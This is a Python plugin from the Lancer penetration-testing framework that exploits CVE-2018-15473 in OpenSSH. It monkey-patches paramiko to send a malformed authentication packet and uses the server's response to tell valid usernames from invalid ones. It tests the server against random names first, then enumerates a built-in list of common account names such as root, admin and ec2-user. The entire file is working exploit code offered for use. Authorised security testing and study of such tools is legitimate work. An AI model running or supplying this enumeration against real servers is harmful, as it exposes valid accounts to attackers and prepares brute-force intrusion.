# -*- coding: utf-8 -*-

"""
    Copyright (c) 2019 Lancer developers
    See the file 'LICENCE' for copying permissions
"""

from plugins.abstractmodules.SSHModule import SSHModule
from core import config, Loot
from random import choice as choice
from random import randint as rand

import paramiko
import string
import socket


class SSHUserEnum(SSHModule):

    def __init__(self):
        super(SSHUserEnum, self).__init__(name="SSH User Enum",
                                          description="Scans for CVE 2018-15473 and attempts to enumerate common"
                                                      " usernames",
                                          loot_name="ssh-user-enum",
                                          intrusion_level=4)
        self.required_programs = ["ssh"]
        self.common_users = ["root", "admin", "test", "guest", "info", "adm", "mysql", "user", "administrator",
                             "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user", "vagrant", "azureuser"]
        # store function we will overwrite to malform the packet
        # noinspection PyProtectedMember
        self.old_parse_service_accept = \
            paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

        # list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the
        # target with these 3 random usernames (there is an almost 0 possibility that they can be real ones)
        self.random_username_list = []
        # populate the list
        for i in range(3):
            user = "".join(choice(string.ascii_lowercase) for x in range(rand(15, 20)))
            self.random_username_list.append(user)

        paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = \
            self.malform_packet
        paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] =\
            self.call_error

    def execute(self, ip: str, port: int) -> None:
        """
        Test the authentication methods supported by the server
        :param ip: IP to use
        :param port: Port to use
        """
        self.create_loot_space(ip, port)

        sock = socket.socket()
        sock.settimeout(config.get_timeout())
        try:
            sock.connect((ip, port))
            sock.close()
        except socket.error:
            self.logger.warning("Unable to connect to {IP}:{PORT}".format(IP=ip, PORT=port))
            return

        if not self.check_vulnerable(ip, port):
            msg = "Does not appear vulnerable to CVE 2018-15473"
            Loot.loot[ip][str(port)][self.loot_name] = msg
            self.logger.info(msg)
        else:
            Loot.loot[ip][str(port)][self.loot_name] = {}
            Loot.loot[ip][str(port)][self.loot_name]["Usernames"] = []
            for username in self.common_users:
                result = self.check_username(ip, port, username)
                if result[1]:
                    Loot.loot[ip][str(port)][self.loot_name]["Usernames"].append(username)
                    self.logger.info("Discovered valid username {USER}".format(USER=username))

    def check_vulnerable(self, ip, port):
        vulnerable = True
        for user in self.random_username_list:
            result = self.check_username(ip, port, user)
            if result[1]:
                vulnerable = False
        return vulnerable

    def check_username(self, ip, port, username, tried=0):
        sock = socket.socket()
        sock.settimeout(config.get_timeout())
        sock.connect((ip, port))
        # instantiate transport
        transport = paramiko.transport.Transport(sock)
        try:
            transport.start_client()
        except paramiko.ssh_exception.SSHException:
            # server was likely flooded, retry up to 3 times
            transport.close()
            if tried < 4:
                tried += 1
                return self.check_username(ip, port, username, tried)
            else:
                print('[-] Failed to negotiate SSH transport')
        try:
            transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
        except BadUsername:
            return (username, False)
        except paramiko.ssh_exception.AuthenticationException:
            return (username, True)
        # Successful auth(?)
        raise Exception("There was an error. Is this the correct version of OpenSSH?")

    def add_boolean(self, *args, **kwargs):
        pass

    # create function to call when username was invalid
    def call_error(self, *args, **kwargs):
        raise BadUsername()

    # create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
    def malform_packet(self, *args, **kwargs):
        old_add_boolean = paramiko.message.Message.add_boolean
        paramiko.message.Message.add_boolean = self.add_boolean
        result = self.old_parse_service_accept(*args, **kwargs)
        # return old add_boolean function so start_client will work again
        paramiko.message.Message.add_boolean = old_add_boolean
        return result


class BadUsername(Exception):
    def __init__(self):
        pass
